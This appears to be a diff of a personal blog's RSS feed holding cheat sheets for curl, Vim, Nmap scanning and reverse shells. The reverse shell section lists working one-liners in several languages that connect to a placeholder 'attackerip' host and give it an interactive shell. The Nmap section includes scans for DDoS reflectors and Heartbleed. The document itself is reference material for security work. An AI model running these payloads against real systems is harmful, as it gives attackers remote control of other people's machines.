+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -G &lt;span style="color:#75715e"># --get: send -d data via get&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="headers">Headers&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl -A &amp;lt;str&amp;gt; &lt;span style="color:#75715e"># --user-agent&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -b name&lt;span style="color:#f92672">=&lt;/span>val &lt;span style="color:#75715e"># --cookie&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -b FILE &lt;span style="color:#75715e"># --cookie&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -H &lt;span style="color:#e6db74">&amp;#34;X-Foo: y&amp;#34;&lt;/span> &lt;span style="color:#75715e"># --header&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl --compressed &lt;span style="color:#75715e"># use deflate/gzip&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ssl">SSL&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl --cacert &amp;lt;file&amp;gt; --capath &amp;lt;dir&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -E, --cert &amp;lt;cert&amp;gt; &lt;span style="color:#75715e"># --cert: Client cert file --cert-type # der/pem/eng&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -k, --insecure &lt;span style="color:#75715e"># for self-signed certs&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="examples">Examples&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Post data:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -d password&lt;span style="color:#f92672">=&lt;/span>x http://x.com/y
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Auth/data:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -u user:pass -d status&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Hello&amp;#34;&lt;/span> http://twitter.com/statuses/update.xml
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># multipart file upload&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -v -include --form key1&lt;span style="color:#f92672">=&lt;/span>value1 --form upload&lt;span style="color:#f92672">=&lt;/span>@localfilename URL
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Use Curl to Check if a remote resource is available&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># details: https://matthewsetter.com/check-if-file-is-available-with-curl/&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -o /dev/null --silent -Iw &lt;span style="color:#e6db74">&amp;#34;%{http_code}&amp;#34;&lt;/span> https://example.com/my.remote.tarball.gz
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
 &lt;!--
 &lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
 嵌入 BiliBili 视频 --></description></item><item><title>怎样诉讼躲在屏幕后面疯狂攻击你的人</title><link>https://hare.one/posts/how-to-sue-somebody-for-harassing/</link><pubDate>Tue, 14 Jul 2020 13:17:12 +0800</pubDate><guid>https://hare.one/posts/how-to-sue-somebody-for-harassing/</guid><description>&lt;h2 id="怎样告躲在屏幕后面疯狂攻击你的人其实很简单完全指南来了">怎样告躲在屏幕后面疯狂攻击你的人？其实很简单，完全指南来了&lt;/h2>
@@ -632,7 +670,7 @@ e - 移动到下个单词结尾
 E - 移动到下个单词结尾(单词含标点)
 b - 移动到上个单词开头
 B - 移动到上个单词开头(单词含标点)
-% - 跳转到配对的符号(默认支持的配对符号组:: '()', '{}', '[]' - 在vim中使用 :h matchpairs 获得更多信息)
+% - 跳转到配对的符号(默认支持的配对符号组:: &amp;#39;()&amp;#39;, &amp;#39;{}&amp;#39;, &amp;#39;[]&amp;#39; - 在vim中使用 :h matchpairs 获得更多信息)
 0 - 移动到行首
 ^ - 移动到行首的非空白符
 $ - 移动到行尾
@@ -715,10 +753,10 @@ u - 将选定区域切换为小写
 U - 将选定区域切换为大写
 &lt;/code>&lt;/pre>&lt;h3 id="寄存器">寄存器&lt;/h3>
 &lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">:reg[isters] - 显示寄存器内容
-&amp;quot;xy - 复制内容到寄存器 x
-&amp;quot;xp - 粘贴寄存器 x 中的内容
-&amp;quot;+y - 复制内容到系统剪贴板寄存器
-&amp;quot;+p - 从系统剪贴板寄存器中粘贴
+&amp;#34;xy - 复制内容到寄存器 x
+&amp;#34;xp - 粘贴寄存器 x 中的内容
+&amp;#34;+y - 复制内容到系统剪贴板寄存器
+&amp;#34;+p - 从系统剪贴板寄存器中粘贴
 Tip 寄存器被存储在 ~/.viminfo 中, 在下次重启vim时仍会加载
 &lt;/code>&lt;/pre>&lt;h3 id="标记">标记&lt;/h3>
 &lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">:marks - 标记列表
@@ -726,7 +764,7 @@ ma - 设置当前位置为标记 a
 `a - 跳转到标记 a 的位置
 y`a - 复制当前位置到标记 a 的内容
 `0 - 跳转到 Vim 上一次使用文件的位置
-`&amp;quot; - 跳转到上一次退出文件时的位置
+`&amp;#34; - 跳转到上一次退出文件时的位置
 `. - 跳转到当前文件最近编辑的位置
 `` - 跳转到上一次跳转前的位置
 :ju[mps] - 列出跳转位置
@@ -826,7 +864,7 @@ zo - 打开光标下的折叠
 zc - 关闭光标下的折叠
 zr - 减少 (reduce) 折叠
 zm - 折起更多 (more)
-zi - 翻转 'foldenable' 的值
+zi - 翻转 &amp;#39;foldenable&amp;#39; 的值
 ]c - 跳转到下个差异点
 [c - 跳转到上个差异点
 do or :diffg[et] - 将另一窗口中差异点处的内容拉取到当前位置并进行替换操作
@@ -835,104 +873,110 @@ dp or :diffpu[t] - 将当前差异点中的内容覆盖到另一文件中的对�
 :dif[fupdate] - 刷新比较结果的高亮和折叠
 :diffo[ff] - 为当前窗口关闭比较模式
 &lt;/code>&lt;/pre></description></item><item><title>Nmap Cheat Sheet</title><link>https://hare.one/cheatsheet/namp-cheat-sheet/</link><pubDate>Wed, 01 Jul 2020 17:27:34 +0800</pubDate><guid>https://hare.one/cheatsheet/namp-cheat-sheet/</guid><description>&lt;h3 id="nmap-target-selection">Nmap Target Selection&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single IP&lt;/span>
-nmap 192.168.1.1
-&lt;span style="color:#75715e">#Scan a host&lt;/span>
-nmap www.testhostname.com
-&lt;span style="color:#75715e">#Scan a range of IPs&lt;/span>
-nmap 192.168.1.1-20
-&lt;span style="color:#75715e">#Scan a subnet&lt;/span>
-nmap 192.168.1.0/24
-&lt;span style="color:#75715e">#Scan targets from a text file&lt;/span>
-nmap -iL list-of-ips.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-port-selection">Nmap Port Selection&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan a single Port&lt;/span>
-nmap -p &lt;span style="color:#ae81ff">22&lt;/span> 192.168.1.1
-&lt;span style="color:#75715e">#Scan a range of ports&lt;/span>
-nmap -p 1-100 192.168.1.1
-&lt;span style="color:#75715e">#Scan 100 most common ports (Fast)&lt;/span>
-nmap -F 192.168.1.1
-&lt;span style="color:#75715e">#Scan all 65535 ports&lt;/span>
-nmap -p- 192.168.1.1
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-port-scan-types">Nmap Port Scan types&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan using TCP connect&lt;/span>
-nmap -sT 192.168.1.1
-&lt;span style="color:#75715e">#Scan using TCP SYN scan (default)&lt;/span>
-nmap -sS 192.168.1.1
-&lt;span style="color:#75715e">#Scan UDP ports&lt;/span>
-nmap -sU -p 123,161,162 192.168.1.1
-&lt;span style="color:#75715e">#Scan selected ports - ignore discovery&lt;/span>
-nmap -Pn -F 192.168.1.1
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="service-and-os-detection">Service and OS Detection&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Detect OS and Services&lt;/span>
-nmap -A 192.168.1.1
-&lt;span style="color:#75715e">#Standard service detection&lt;/span>
-nmap -sV 192.168.1.1
-&lt;span style="color:#75715e">#More aggressive Service Detection&lt;/span>
-nmap -sV --version-intensity &lt;span style="color:#ae81ff">5&lt;/span> 192.168.1.1
-&lt;span style="color:#75715e">#Lighter banner grabbing detection&lt;/span>
-nmap -sV --version-intensity &lt;span style="color:#ae81ff">0&lt;/span> 192.168.1.1
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-output-formats">Nmap Output Formats&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Save default output to file&lt;/span>
-nmap -oN outputfile.txt 192.168.1.1
-&lt;span style="color:#75715e">#Save results as XML&lt;/span>
-nmap -oX outputfile.xml 192.168.1.1
-&lt;span style="color:#75715e">#Save results in a format for grep&lt;/span>
-nmap -oG outputfile.txt 192.168.1.1
-&lt;span style="color:#75715e">#Save in all formats&lt;/span>
-nmap -oA outputfile 192.168.1.1
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="digging-deeper-with-nse-scripts">Digging deeper with NSE Scripts&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan using default safe scripts&lt;/span>
-nmap -sV -sC 192.168.1.1
-&lt;span style="color:#75715e">#Get help for a script&lt;/span>
-nmap --script-help&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed
-&lt;span style="color:#75715e">#Scan using a specific NSE script&lt;/span>
-nmap -sV -p &lt;span style="color:#ae81ff">443&lt;/span> –script&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed.nse 192.168.1.1
-&lt;span style="color:#75715e">#Scan with a set of scripts&lt;/span>
-nmap -sV --script&lt;span style="color:#f92672">=&lt;/span>smb* 192.168.1.1
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="a-scan-to-search-for-ddos-reflection-udp-services">A scan to search for DDOS reflection UDP services&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Scan for UDP DDOS reflectors&lt;/span>
-nmap –sU –A –PN –n –pU:19,53,123,161 –script&lt;span style="color:#f92672">=&lt;/span>ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="http-service-information">HTTP Service Information&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Gather page titles from HTTP services&lt;/span>
-nmap --script&lt;span style="color:#f92672">=&lt;/span>http-title 192.168.1.0/24
-&lt;span style="color:#75715e">#Get HTTP headers of web services&lt;/span>
-nmap --script&lt;span style="color:#f92672">=&lt;/span>http-headers 192.168.1.0/24
-&lt;span style="color:#75715e">#Find web apps from known paths&lt;/span>
-nmap --script&lt;span style="color:#f92672">=&lt;/span>http-enum 192.168.1.0/24
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="detect-heartbleed-ssl-vulnerability">Detect Heartbleed SSL Vulnerability&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Heartbleed Testing&lt;/span>
-nmap -sV -p &lt;span style="color:#ae81ff">443&lt;/span> --script&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed 192.168.1.0/24
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ip-address-information">IP Address information&lt;/h3>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e">#Find Information about IP address&lt;/span>
-nmap --script&lt;span style="color:#f92672">=&lt;/span>asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24
-&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare.one/cheatsheet/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare.one/cheatsheet/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nc-版本">nc 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> &amp;gt;/tmp/f
-nc attackerip 8888|/bin/sh|nc attackerip &lt;span style="color:#ae81ff">9999&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="bash-版本">Bash 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 0&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span>
-bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 &amp;lt;&amp;amp;&lt;span style="color:#ae81ff">2&lt;/span>
-exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5|&lt;span style="color:#66d9ef">while&lt;/span> read line;&lt;span style="color:#66d9ef">do&lt;/span> $line &amp;gt;&amp;amp;&lt;span style="color:#ae81ff">5&lt;/span> 2&amp;gt;&amp;amp;1;&lt;span style="color:#66d9ef">done&lt;/span>
-0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444; sh &amp;lt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span> &amp;gt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span> 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span>
-mknod backpipe p; nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe 2&amp;gt;backpipe
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="perl-版本">Perl 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">perl -e &lt;span style="color:#e6db74">&amp;#39;use Socket;$i=&amp;#34;attackerip&amp;#34;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="python-版本">Python 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python -c &lt;span style="color:#e6db74">&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;attackerip&amp;#34;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="php-版本">php 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">php -r &lt;span style="color:#e6db74">&amp;#39;$sock=fsockopen(&amp;#34;attackerip&amp;#34;,2333);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ruby-版本">Ruby 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ruby -rsocket -e&lt;span style="color:#e6db74">&amp;#39;f=TCPSocket.open(&amp;#34;attackerip&amp;#34;,2333).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="java-版本">Java 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">r &lt;span style="color:#f92672">=&lt;/span> Runtime.getRuntime&lt;span style="color:#f92672">()&lt;/span>
-p &lt;span style="color:#f92672">=&lt;/span> r.exec&lt;span style="color:#f92672">([&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;-c&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5 | while read line; do \\&lt;/span>$line&lt;span style="color:#e6db74"> 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> as String&lt;span style="color:#f92672">[])&lt;/span>
-p.waitFor&lt;span style="color:#f92672">()&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="lua-版本">Lua 版本&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">lua -e &lt;span style="color:#e6db74">&amp;#34;require(&amp;#39;socket&amp;#39;);require(&amp;#39;os&amp;#39;);t=socket.tcp();t:connect(&amp;#39;attackerip&amp;#39;,&amp;#39;2333&amp;#39;);os.execute(&amp;#39;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#39;);&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test</title><link>https://hare.one/test/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://hare.one/test/</guid><description>&lt;p>这是一个测试页面&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan a single IP&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan a host&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap www.testhostname.com
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan a range of IPs&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap 192.168.1.1-20
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan a subnet&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap 192.168.1.0/24
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan targets from a text file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -iL list-of-ips.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-port-selection">Nmap Port Selection&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan a single Port&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -p &lt;span style="color:#ae81ff">22&lt;/span> 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan a range of ports&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -p 1-100 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan 100 most common ports (Fast)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -F 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan all 65535 ports&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -p- 192.168.1.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-port-scan-types">Nmap Port Scan types&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan using TCP connect&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sT 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan using TCP SYN scan (default)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sS 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan UDP ports&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sU -p 123,161,162 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan selected ports - ignore discovery&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -Pn -F 192.168.1.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="service-and-os-detection">Service and OS Detection&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Detect OS and Services&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -A 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Standard service detection&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#More aggressive Service Detection&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV --version-intensity &lt;span style="color:#ae81ff">5&lt;/span> 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Lighter banner grabbing detection&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV --version-intensity &lt;span style="color:#ae81ff">0&lt;/span> 192.168.1.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="nmap-output-formats">Nmap Output Formats&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Save default output to file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -oN outputfile.txt 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Save results as XML&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -oX outputfile.xml 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Save results in a format for grep&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -oG outputfile.txt 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Save in all formats&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -oA outputfile 192.168.1.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="digging-deeper-with-nse-scripts">Digging deeper with NSE Scripts&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan using default safe scripts&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV -sC 192.168.1.1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Get help for a script&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap --script-help&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan using a specific NSE script&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV -p &lt;span style="color:#ae81ff">443&lt;/span> –script&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed.nse 192.168.1.1
